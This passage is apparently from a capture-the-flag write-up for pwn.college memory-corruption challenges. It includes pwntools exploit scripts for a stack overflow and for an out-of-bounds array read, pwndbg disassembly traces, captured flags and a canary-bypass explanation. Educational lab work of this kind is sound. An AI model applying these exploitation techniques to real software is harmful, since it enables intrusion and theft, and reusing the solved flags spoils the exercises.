───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffec3de8700`
- [x] Location of `char*` to array: `0x7ffec3de8780`
- [x] Offset of the flag: `0x5040`


### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
import re

attempt = 0

while True:
    p = process('/challenge/pointer-problems-hard')

    output = p.recvuntil(b'Payload size:')

    # input buffer base
    buffer_addr = 0x7ffec3de8700
    # the target char* pointer on stack
    char_ptr_addr = 0x7ffec3de8780
    # the flag's address in the bss
    flag_offset = 0x5040

    # Calculate offset & payload_size
    offset = char_ptr_addr - buffer_addr
    payload_size = offset + 2

    # Build payload
    payload = b"A" * offset
    payload += struct.pack("<H", flag_offset)

    attempt += 1
    print(f"[+] Attempt {attempt}")

    try:
        p.sendline(str(payload_size))

        # Send payload
        p.recvuntil(b'Send your payload')
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@program-security~pointer-problems-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/pointer-problems-hard': pid 17798
[+] Attempt 1
/home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[+] Receiving all data: Done (72B)
[*] Process '/challenge/pointer-problems-hard' stopped with exit code 0 (pid 17798)
[+] Starting local process '/challenge/pointer-problems-hard': pid 17801

# ---- snip ----

[+] Attempt 37
[+] Receiving all data: Done (118B)
[*] Process '/challenge/pointer-problems-hard' stopped with exit code 0 (pid 17912)
[!!!] FLAG FOUND !!!
 (up to 130 bytes)!
The string on the stack is: pwn.college{AWPL7LqV37TqZ51Fg7upWPoZuEI.QXzgzN4EDL4ITM0EzW}

Goodbye!
```

&nbsp;

## Anomalous Array (Easy)

```
hacker@program-security~anomalous-array-easy:~$ /challenge/anomalous-array-easy 
The challenge() function has just been launched!

# ---- snip ----

Our stack pointer points to 0x7ffee60f7980, and our base pointer points to 0x7ffee60f8b40.
This means that we have (decimal) 570 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 4560 bytes.
The input buffer begins at 0x7ffee60f8978, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 54 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
This challenge has an array of cool hacker numbers on the stack, which you can access by providing an index.
The array starts at 0x7ffee60f8978, and is 432 bytes long.
The flag is located  at 0x7ffee60f7a00.

Which number would you like to view? 0
You have selected index 0, which is 0 bytes into the array.
Your hacker number is ffffffffdeadbeef
Let's see what happened with the stack:

# ---- snip ----

The program's memory status:
- the array starts at 0x7ffee60f8978
- the address of the flag is 0x7ffee60f7a00.
Your hacker number is ffffffffdeadbeef

Goodbye!
```

This challenge prints out the 8 bytes pointed to by the `array[index]` where the suer gets to control the `index`.

Since we know the location of the flag and the array, we can find the index, and get the first 8 bytes of the flag.

```py
In [1]: array_addr = 0x7ffee60f8978
   ...: flag_addr  = 0x7ffee60f7a00
   ...: 
   ...: offset = flag_addr - array_addr
   ...: size_per_entry = 8
   ...: 
   ...: index = offset // size_per_entry
   ...: 
   ...: if offset % size_per_entry == 0:
   ...:     print(f"Index = {index} (aligned)")
   ...: else:
   ...:     print(f"Offset falls in between entries. Nearest index = {index}")
   ...: 
Index = -495 (aligned)
```

Let's provide this as the index.

```
hacker@program-security~anomalous-array-easy:~$ /challenge/anomalous-array-easy 
The challenge() function has just been launched!

# ---- snip ----

Which number would you like to view? -495
You have selected index -495, which is -3960 bytes into the array.
Your hacker number is 6c6c6f632e6e7770

# ---- snip ----
```

```py
In [2]: hacker_num = "6c6c6f632e6e7770"
   ...: chunk_bytes = bytes.fromhex(hacker_num)[::-1]
   ...: print(chunk_bytes)
b'pwn.coll'
```

So our logic is working, but we will have to brute force 8 bytes of the flag at a time.

### Exploit

```py title="~/script" showLineNumbers
from pwn import *
import re

# Setup addresses
array_addr = 0x7ffc61dcecc8
flag_addr  = 0x7ffc61dcdd50
chunk_size = 8

# Calculate starting point
base_index = (flag_addr - array_addr) // chunk_size

flag = ""
current_index = base_index

print("[*] Starting dynamic leak...")

while "}" not in flag:
    # Start fresh process for each 8-byte read
    p = process('/challenge/anomalous-array-easy', level='error') 
    
    p.sendlineafter(b"Which number would you like to view?", str(current_index).encode())
    output = p.recvall().decode(errors="ignore")
    
    # Extract hex
    match = re.search(r"Your hacker number is ([0-9a-fA-F]+)", output)
    if match:
        hacker_num = match.group(1).zfill(16) # Pad to 8 bytes
        
        # Convert from hex -> reverse for little endian -> decode
        chunk_bytes = bytes.fromhex(hacker_num)[::-1]
        flag_chunk = chunk_bytes.decode('latin-1')
        
        flag += flag_chunk
        print(f"Index {current_index}: Found {flag_chunk!r}")
        
    current_index += 1

# Clean up any trailing garbage after the closing brace
final_flag = flag.split("}")[0] + "}"

print("-" * 20)
log.success(f"Flag captured: {final_flag}")
```

```
hacker@program-security~anomalous-array-easy:~$ python ~/script.py 
[*] Starting dynamic leak...
Index -495: Found 'pwn.coll'
Index -494: Found 'ege{kBqR'
Index -493: Found 'nXbNGylh'
Index -492: Found '6kMzuR4h'
Index -491: Found 'cLmTdvu.'
Index -490: Found 'QX0gzN4E'
Index -489: Found 'DL4ITM0E'
Index -488: Found 'zW}\n\x00\x00\x00\x00'
--------------------
[+] Flag captured: pwn.college{kBqRnXbNGylh6kMzuR4hcLmTdvu.QX0gzN4EDL4ITM0EzW}
```

&nbsp;

## Anomalous Array (Hard)

```
hacker@program-security~anomalous-array-hard:/$ /challenge/anomalous-array-hard 
Which number would you like to view? 0
Your hacker number is ffffffffdeadbeef
Goodbye!
```

In order to solve this challenge, we need the following things:

* [ ] Location of flag
* [ ] Location of array

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001551 <+0>:     endbr64
   0x0000000000001555 <+4>:     push   rbp
   0x0000000000001556 <+5>:     mov    rbp,rsp
   0x0000000000001559 <+8>:     sub    rsp,0x640
   0x0000000000001560 <+15>:    mov    DWORD PTR [rbp-0x624],edi
   0x0000000000001566 <+21>:    mov    QWORD PTR [rbp-0x630],rsi
   0x000000000000156d <+28>:    mov    QWORD PTR [rbp-0x638],rdx
   0x0000000000001574 <+35>:    lea    rdx,[rbp-0x5c0]
   0x000000000000157b <+42>:    mov    eax,0x0
   0x0000000000001580 <+47>:    mov    ecx,0xb5
   0x0000000000001585 <+52>:    mov    rdi,rdx
   0x0000000000001588 <+55>:    rep stos QWORD PTR es:[rdi],rax
   0x000000000000158b <+58>:    lea    rax,[rbp-0x5c0]
   0x0000000000001592 <+65>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001596 <+69>:    mov    QWORD PTR [rbp-0x18],0x0
   0x000000000000159e <+77>:    mov    esi,0x0
   0x00000000000015a3 <+82>:    lea    rdi,[rip+0xa5e]        # 0x2008
   0x00000000000015aa <+89>:    mov    eax,0x0
   0x00000000000015af <+94>:    call   0x10e0 <open@plt>
   0x00000000000015b4 <+99>:    mov    ecx,eax
   0x00000000000015b6 <+101>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000015ba <+105>:   mov    edx,0x100
   0x00000000000015bf <+110>:   mov    rsi,rax
   0x00000000000015c2 <+113>:   mov    edi,ecx
   0x00000000000015c4 <+115>:   call   0x10c0 <read@plt>
   0x00000000000015c9 <+120>:   mov    QWORD PTR [rbp-0x18],0x1000
   0x00000000000015d1 <+128>:   mov    DWORD PTR [rbp-0x610],0xdeadbeef
   0x00000000000015db <+138>:   mov    DWORD PTR [rbp-0x60c],0x1337c0de
   0x00000000000015e5 <+148>:   mov    DWORD PTR [rbp-0x608],0xfaceb00c
   0x00000000000015ef <+158>:   mov    DWORD PTR [rbp-0x604],0xfeedface
   0x00000000000015f9 <+168>:   mov    DWORD PTR [rbp-0x600],0x8badf00d
   0x0000000000001603 <+178>:   mov    DWORD PTR [rbp-0x5fc],0x1337
   0x000000000000160d <+188>:   mov    DWORD PTR [rbp-0x5f8],0xc0ffee
   0x0000000000001617 <+198>:   mov    DWORD PTR [rbp-0x5f4],0xf00dbeef
   0x0000000000001621 <+208>:   mov    DWORD PTR [rbp-0x5f0],0x1337beef
   0x000000000000162b <+218>:   mov    DWORD PTR [rbp-0x5ec],0xb00cdead
   0x0000000000001635 <+228>:   mov    DWORD PTR [rbp-0x5e8],0xface1337
   0x000000000000163f <+238>:   mov    DWORD PTR [rbp-0x5e4],0xcafebabe
   0x0000000000001649 <+248>:   mov    DWORD PTR [rbp-0x5e0],0xbaadf00d
   0x0000000000001653 <+258>:   mov    DWORD PTR [rbp-0x5dc],0x600d1dea
   0x000000000000165d <+268>:   mov    DWORD PTR [rbp-0x5d8],0xbadc0de
   0x0000000000001667 <+278>:   mov    DWORD PTR [rbp-0x5d4],0xdead10cc
   0x0000000000001671 <+288>:   mov    DWORD PTR [rbp-0x5d0],0xbadcab1e
   0x000000000000167b <+298>:   mov    DWORD PTR [rbp-0x5cc],0xddba11
   0x0000000000001685 <+308>:   mov    DWORD PTR [rbp-0x4],0x0
   0x000000000000168c <+315>:   jmp    0x16da <challenge+393>
   0x000000000000168e <+317>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001691 <+320>:   movsxd rcx,eax
   0x0000000000001694 <+323>:   movabs rdx,0xe38e38e38e38e38f
   0x000000000000169e <+333>:   mov    rax,rcx
   0x00000000000016a1 <+336>:   mul    rdx
   0x00000000000016a4 <+339>:   shr    rdx,0x4
   0x00000000000016a8 <+343>:   mov    rax,rdx
   0x00000000000016ab <+346>:   shl    rax,0x3
   0x00000000000016af <+350>:   add    rax,rdx
   0x00000000000016b2 <+353>:   add    rax,rax
   0x00000000000016b5 <+356>:   sub    rcx,rax
   0x00000000000016b8 <+359>:   mov    rdx,rcx
   0x00000000000016bb <+362>:   mov    eax,DWORD PTR [rbp+rdx*4-0x610]
   0x00000000000016c2 <+369>:   cdqe
   0x00000000000016c4 <+371>:   mov    edx,DWORD PTR [rbp-0x4]
   0x00000000000016c7 <+374>:   movsxd rdx,edx
   0x00000000000016ca <+377>:   add    rdx,0x54
   0x00000000000016ce <+381>:   mov    QWORD PTR [rbp+rdx*8-0x5b8],rax
   0x00000000000016d6 <+389>:   add    DWORD PTR [rbp-0x4],0x1
   0x00000000000016da <+393>:   cmp    DWORD PTR [rbp-0x4],0x5f
   0x00000000000016de <+397>:   jle    0x168e <challenge+317>
   0x00000000000016e0 <+399>:   mov    DWORD PTR [rbp-0x614],0x0
   0x00000000000016ea <+409>:   lea    rdi,[rip+0x91f]        # 0x2010
   0x00000000000016f1 <+416>:   mov    eax,0x0
   0x00000000000016f6 <+421>:   call   0x10b0 <printf@plt>
   0x00000000000016fb <+426>:   lea    rax,[rbp-0x614]
   0x0000000000001702 <+433>:   mov    rsi,rax
   0x0000000000001705 <+436>:   lea    rdi,[rip+0x92a]        # 0x2036
   0x000000000000170c <+443>:   mov    eax,0x0
   0x0000000000001711 <+448>:   call   0x10f0 <__isoc99_scanf@plt>
   0x0000000000001716 <+453>:   mov    eax,DWORD PTR [rbp-0x614]
   0x000000000000171c <+459>:   cdqe
   0x000000000000171e <+461>:   add    rax,0x54
   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
   0x000000000000172a <+473>:   mov    rsi,rax
   0x000000000000172d <+476>:   lea    rdi,[rip+0x905]        # 0x2039
   0x0000000000001734 <+483>:   mov    eax,0x0
   0x0000000000001739 <+488>:   call   0x10b0 <printf@plt>
   0x000000000000173e <+493>:   lea    rdi,[rip+0x910]        # 0x2055
   0x0000000000001745 <+500>:   call   0x10a0 <puts@plt>
   0x000000000000174a <+505>:   mov    eax,0x0
   0x000000000000174f <+510>:   leave
   0x0000000000001750 <+511>:   ret
End of assembler dump.
```

```
# ---- snip ----

   0x000000000000159e <+77>:    mov    esi,0x0
   0x00000000000015a3 <+82>:    lea    rdi,[rip+0xa5e]        # 0x2008
   0x00000000000015aa <+89>:    mov    eax,0x0
   0x00000000000015af <+94>:    call   0x10e0 <open@plt>
   0x00000000000015b4 <+99>:    mov    ecx,eax
   0x00000000000015b6 <+101>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000015ba <+105>:   mov    edx,0x100
   0x00000000000015bf <+110>:   mov    rsi,rax
   0x00000000000015c2 <+113>:   mov    edi,ecx
   0x00000000000015c4 <+115>:   call   0x10c0 <read@plt>

# ---- snip ----
```

The program opens a file, and then reads the contents of said file.
In the `open@plt` call, the `rdi` register holds thename of the file to be read whereas in the `read@plt` call, the `rsi` register holds the location of the buffer.

Let's set breakpoints at `challenge+94` to see which file is being read, and at `challenge+115` in order to see where the file's contents are being read.

```
pwndbg> break *(challenge+94)
Breakpoint 1 at 0x15af
pwndbg> break *(challenge+115)
Breakpoint 2 at 0x15c4
```

```
pwndbg> run
Starting program: /challenge/anomalous-array-hard 

Breakpoint 1, 0x000064b966f8d5af in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 RAX  0
 RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x7ffe79e96110 ◂— 0
 RDI  0x64b966f8e008 ◂— 0x67616c662f /* '/flag' */
 RSI  0
 R8   0
 R9   0x74d42a14fd60 (_dl_fini) ◂— endbr64 
 R10  0x13
 R11  2
 R12  0x64b966f8d100 (_start) ◂— endbr64 
 R13  0x7ffe79e977f0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
 RSP  0x7ffe79e96090 ◂— 0
 RIP  0x64b966f8d5af (challenge+94) ◂— call open@plt
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x64b966f8d5af <challenge+94>     call   open@plt                    <open@plt>
        file: 0x64b966f8e008 ◂— 0x67616c662f /* '/flag' */
        oflag: 0
        vararg: 0x7ffe79e96110 ◂— 0
 
   0x64b966f8d5b4 <challenge+99>     mov    ecx, eax
   0x64b966f8d5b6 <challenge+101>    mov    rax, qword ptr [rbp - 0x10]
   0x64b966f8d5ba <challenge+105>    mov    edx, 0x100                      EDX => 0x100
   0x64b966f8d5bf <challenge+110>    mov    rsi, rax
   0x64b966f8d5c2 <challenge+113>    mov    edi, ecx
b+ 0x64b966f8d5c4 <challenge+115>    call   read@plt                    <read@plt>
 
   0x64b966f8d5c9 <challenge+120>    mov    qword ptr [rbp - 0x18], 0x1000
   0x64b966f8d5d1 <challenge+128>    mov    dword ptr [rbp - 0x610], 0xdeadbeef
   0x64b966f8d5db <challenge+138>    mov    dword ptr [rbp - 0x60c], 0x1337c0de
   0x64b966f8d5e5 <challenge+148>    mov    dword ptr [rbp - 0x608], 0xfaceb00c
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7ffe79e96090 ◂— 0
01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
04:0020│-620 0x7ffe79e960b0 ◂— 0
... ↓        3 skipped
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0   0x64b966f8d5af challenge+94
   1   0x64b966f8d7d7 main+134
   2   0x74d429f60083 __libc_start_main+243
   3   0x64b966f8d12e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see that the content of `rdi` is `/flag` right before the `open@plt` call is made. So, it is reding the flag. Let's continue and see where to.

```
pwndbg> c
Continuing.

Breakpoint 2, 0x000064b966f8d5c4 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
*RAX  0x7ffe79e96110 ◂— 0
 RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
*RCX  0xffffffff
*RDX  0x100
*RDI  0xffffffff
*RSI  0x7ffe79e96110 ◂— 0
 R8   0
 R9   0x74d42a14fd60 (_dl_fini) ◂— endbr64 
*R10  0
*R11  0x246
 R12  0x64b966f8d100 (_start) ◂— endbr64 
 R13  0x7ffe79e977f0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
 RSP  0x7ffe79e96090 ◂— 0
*RIP  0x64b966f8d5c4 (challenge+115) ◂— call read@plt
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
   0x64b966f8d5b4 <challenge+99>     mov    ecx, eax
   0x64b966f8d5b6 <challenge+101>    mov    rax, qword ptr [rbp - 0x10]
   0x64b966f8d5ba <challenge+105>    mov    edx, 0x100                      EDX => 0x100
   0x64b966f8d5bf <challenge+110>    mov    rsi, rax
   0x64b966f8d5c2 <challenge+113>    mov    edi, ecx
 ► 0x64b966f8d5c4 <challenge+115>    call   read@plt                    <read@plt>
        fd: 0xffffffff
        buf: 0x7ffe79e96110 ◂— 0
        nbytes: 0x100
 
   0x64b966f8d5c9 <challenge+120>    mov    qword ptr [rbp - 0x18], 0x1000
   0x64b966f8d5d1 <challenge+128>    mov    dword ptr [rbp - 0x610], 0xdeadbeef
   0x64b966f8d5db <challenge+138>    mov    dword ptr [rbp - 0x60c], 0x1337c0de
   0x64b966f8d5e5 <challenge+148>    mov    dword ptr [rbp - 0x608], 0xfaceb00c
   0x64b966f8d5ef <challenge+158>    mov    dword ptr [rbp - 0x604], 0xfeedface
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7ffe79e96090 ◂— 0
01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
04:0020│-620 0x7ffe79e960b0 ◂— 0
... ↓        3 skipped
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0   0x64b966f8d5c4 challenge+115
   1   0x64b966f8d7d7 main+134
   2   0x74d429f60083 __libc_start_main+243
   3   0x64b966f8d12e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

So we have the location where is flag is stored in memory. 

* [x] Location of flag: `0x7ffe79e96110`
* [ ] Location of array

Later in the assembly, we can see that the program calls `scanf` to read the `index` from the user, performs some operations using that index, and then prints the data.

```
# ---- snip ----

   0x00000000000016fb <+426>:   lea    rax,[rbp-0x614]
   0x0000000000001702 <+433>:   mov    rsi,rax
   0x0000000000001705 <+436>:   lea    rdi,[rip+0x92a]        # 0x2036
   0x000000000000170c <+443>:   mov    eax,0x0
   0x0000000000001711 <+448>:   call   0x10f0 <__isoc99_scanf@plt>
   0x0000000000001716 <+453>:   mov    eax,DWORD PTR [rbp-0x614]
   0x000000000000171c <+459>:   cdqe
   0x000000000000171e <+461>:   add    rax,0x54
   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
   0x000000000000172a <+473>:   mov    rsi,rax
   0x000000000000172d <+476>:   lea    rdi,[rip+0x905]        # 0x2039
   0x0000000000001734 <+483>:   mov    eax,0x0
   0x0000000000001739 <+488>:   call   0x10b0 <printf@plt>

# ---- snip ----   
```

Specifically, if we look at these instruction: 
```
   0x0000000000001722 <+465>:   mov    rax,QWORD PTR [rbp+rax*8-0x5b8]
   0x000000000000172a <+473>:   mov    rsi,rax
```
We can see that a value is moved in `rax`, then `rsi` and then it printed. This value is the `hacker_num`.

If we pass `index=0` the value at the start of the array will be returned to us as `hacker_num` and we will also get to see it's location, and thus the location of the array.

```
pwndbg> break *(challenge+465)
Breakpoint 3 at 0x64b966f8d722
```

```
pwndbg> c
Continuing.
Which number would you like to view? 0

Breakpoint 3, 0x000064b966f8d722 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
*RAX  0x54
 RBX  0x64b966f8d7e0 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  0
*RDI  0x7ffe79e95b50 ◂— 0x30 /* '0' */
*RSI  0
*R8   0xa
*R9   0
*R10  0x74d42a0d7ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
*R11  0
 R12  0x64b966f8d100 (_start) ◂— endbr64 
 R13  0x7ffe79e977f0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe79e966d0 —▸ 0x7ffe79e97700 ◂— 0
 RSP  0x7ffe79e96090 ◂— 0
*RIP  0x64b966f8d722 (challenge+465) ◂— mov rax, qword ptr [rbp + rax*8 - 0x5b8]
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x64b966f8d722 <challenge+465>    mov    rax, qword ptr [rbp + rax*8 - 0x5b8]     RAX, [0x7ffe79e963b8] => 0xffffffffdeadbeef
   0x64b966f8d72a <challenge+473>    mov    rsi, rax                                 RSI => 0xffffffffdeadbeef
   0x64b966f8d72d <challenge+476>    lea    rdi, [rip + 0x905]                       RDI => 0x64b966f8e039 ◂— 'Your hacker number is %0lx\n'
   0x64b966f8d734 <challenge+483>    mov    eax, 0                                   EAX => 0
   0x64b966f8d739 <challenge+488>    call   printf@plt                  <printf@plt>
 
   0x64b966f8d73e <challenge+493>    lea    rdi, [rip + 0x910]     RDI => 0x64b966f8e055 ◂— 'Goodbye!'
   0x64b966f8d745 <challenge+500>    call   puts@plt                    <puts@plt>
 
   0x64b966f8d74a <challenge+505>    mov    eax, 0                 EAX => 0
   0x64b966f8d74f <challenge+510>    leave  
   0x64b966f8d750 <challenge+511>    ret    
 
   0x64b966f8d751 <main>             endbr64 
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7ffe79e96090 ◂— 0
01:0008│-638 0x7ffe79e96098 —▸ 0x7ffe79e97808 —▸ 0x7ffe79e98694 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-630 0x7ffe79e960a0 —▸ 0x7ffe79e977f8 —▸ 0x7ffe79e98674 ◂— '/challenge/anomalous-array-hard'
03:0018│-628 0x7ffe79e960a8 ◂— 0x100000000
04:0020│-620 0x7ffe79e960b0 ◂— 0
05:0028│-618 0x7ffe79e960b8 ◂— 0
06:0030│-610 0x7ffe79e960c0 ◂— 0x1337c0dedeadbeef
07:0038│-608 0x7ffe79e960c8 ◂— 0xfeedfacefaceb00c
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0   0x64b966f8d722 challenge+465
   1   0x64b966f8d7d7 main+134
   2   0x74d429f60083 __libc_start_main+243
   3   0x64b966f8d12e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

If we look carefully at the `DISASM` section of teh output, we can see the `hacker_num` being moved into `rax`, and it's address.

* [x] Location of flag: `0x7ffe79e96110`
* [x] Location of array: `0x7ffe79e963b8`

### Exploit

```py title="~/script" showLineNumbers
from pwn import *
import re

# Setup addresses
array_addr = 0x7ffe79e963b8
flag_addr  = 0x7ffe79e96110
chunk_size = 8

# Calculate starting point
base_index = (flag_addr - array_addr) // chunk_size

flag = ""
current_index = base_index

print("[*] Starting dynamic leak...")

while "}" not in flag:
    # Start fresh process for each 8-byte read
    p = process('/challenge/anomalous-array-easy', level='error') 
    
    p.sendlineafter(b"Which number would you like to view?", str(current_index).encode())
    output = p.recvall().decode(errors="ignore")
    
    # Extract hex
    match = re.search(r"Your hacker number is ([0-9a-fA-F]+)", output)
    if match:
        hacker_num = match.group(1).zfill(16) # Pad to 8 bytes
        
        # Convert from hex -> reverse for little endian -> decode
        chunk_bytes = bytes.fromhex(hacker_num)[::-1]
        flag_chunk = chunk_bytes.decode('latin-1')
        
        flag += flag_chunk
        print(f"Index {current_index}: Found {flag_chunk!r}")
        
    current_index += 1

# Clean up any trailing garbage after the closing brace
final_flag = flag.split("}")[0] + "}"

print("-" * 20)
log.success(f"Flag captured: {final_flag}")
```

```
hacker@program-security~anomalous-array-hard:~$ python ~/script.py 
[*] Starting dynamic leak...
Index -85: Found 'pwn.coll'
Index -84: Found 'ege{IEDf'
Index -83: Found '8TN9GJDa'
Index -82: Found '3d2J7WxH'
Index -81: Found 'QBCBO8w.'
Index -80: Found 'QX1gzN4E'
Index -79: Found 'DL4ITM0E'
Index -78: Found 'zW}\n\x00\x00\x00\x00'
--------------------
[+] Flag captured: pwn.college{IEDf8TN9GJDa3d2J7WxHQBCBO8w.QX1gzN4EDL4ITM0EzW}
```

&nbsp;

## Loop Lunacy (Easy)

```
hacker@program-security~loop-lunacy-easy:/$ /challenge/loop-lunacy-easy 
###
### Welcome to /challenge/loop-lunacy-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff07372040 (rsp+0x0000) | a0 f6 88 1f 66 78 00 00 | 0x000078661f88f6a0 |
| 0x00007fff07372048 (rsp+0x0008) | f8 31 37 07 ff 7f 00 00 | 0x00007fff073731f8 |
| 0x00007fff07372050 (rsp+0x0010) | e8 31 37 07 ff 7f 00 00 | 0x00007fff073731e8 |
| 0x00007fff07372058 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff07372060 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff07372068 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff07372070 (rsp+0x0030) | 80 20 37 07 ff 7f 00 00 | 0x00007fff07372080 |
| 0x00007fff07372078 (rsp+0x0038) | 98 20 37 07 ff 7f 00 00 | 0x00007fff07372098 |
| 0x00007fff07372080 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff07372088 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff07372090 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff07372098 (rsp+0x0058) | 00 00 00 00 42 60 00 00 | 0x0000604200000000 |
| 0x00007fff073720a0 (rsp+0x0060) | f0 30 37 07 ff 7f 00 00 | 0x00007fff073730f0 |
| 0x00007fff073720a8 (rsp+0x0068) | 00 81 2b a0 0a db 4f d5 | 0xd54fdb0aa02b8100 |
| 0x00007fff073720b0 (rsp+0x0070) | f0 30 37 07 ff 7f 00 00 | 0x00007fff073730f0 |
| 0x00007fff073720b8 (rsp+0x0078) | 3c 91 2e 70 42 60 00 00 | 0x00006042702e913c |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff07372040, and our base pointer points to 0x7fff073720b0.
This means that we have (decimal) 16 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 128 bytes.
The input buffer begins at 0x7fff07372080, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 23 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fff073720b8, 56 bytes after the start of your input buffer.
That means that you will need to input at least 64 bytes (23 to fill the buffer,
33 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

While canaries are enabled, this program reads your input 1 byte at a time,
tracking how many bytes have been read and the offset from your input buffer
to read the byte to using a local variable on the stack.
The code for doing this looks something like:
    while (n < size) {
      n += read(0, input + n, 1);
    }
As it turns out, you can use this local variable `n` to jump over the canary.
Your input buffer is stored at 0x7fff07372080, and this local variable `n`
is stored 24 bytes after it at 0x7fff07372098.

When you overwrite `n`, you will change the program's understanding of
how many bytes it has read in so far, and when it runs `read(0, input + n, 1)`
again, it will read into an offset that you control.
This will allow you to reposition the write *after* the canary, and write
into the return address!

The payload size is deceptively simple.
You don't have to think about how many bytes you will end up skipping:
with the while loop described above, the payload size marks the
*right-most* byte that will be read into.
As far as this challenge is concerned, there is no difference between bytes
"skipped" by fiddling with `n` and bytes read in normally: the values
of `n` and `size` are all that matters to determine when to stop reading,
*not* the number of bytes actually read in.

That being said, you *do* need to be careful on the sending side: don't send
the bytes that you're effectively skipping!

Because the binary is position independent, you cannot know
exactly where the win_authed() function is located.
This means that it is not clear what should be written into the return address.

Payload size: 
```

We have to keep providing a single byte of payload until we reach the address where `n` is stored, which is after 24 bytes.
Then we have to overwrite the value of `n` with the distance between the buffer address and the saved return address.

Before we craft the exploit, we need the following:
- [ ] Offset of instruction within `win_authed()` which skips the authentication

### Binary Analysis

```
pwndbg> disass win_authed 
Dump of assembler code for function win_authed:
   0x0000000000001632 <+0>:     endbr64
   0x0000000000001636 <+4>:     push   rbp
   0x0000000000001637 <+5>:     mov    rbp,rsp
   0x000000000000163a <+8>:     sub    rsp,0x10
